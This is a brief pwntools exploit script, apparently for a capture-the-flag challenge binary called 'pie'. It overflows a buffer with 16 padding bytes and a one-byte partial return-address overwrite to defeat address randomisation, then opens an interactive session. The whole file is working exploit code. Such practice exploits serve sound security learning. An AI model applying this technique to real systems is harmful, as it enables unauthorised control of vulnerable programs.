from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p = process('./pie')
elf = ELF('./pie')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# gdb.attach(p, 'b *$rebase(0x123a)')
offset = 0x10
payload = offset*b'a' + p8(0x43)
p.sendafter(b'>>\n', payload)
# pause()
p.interactive()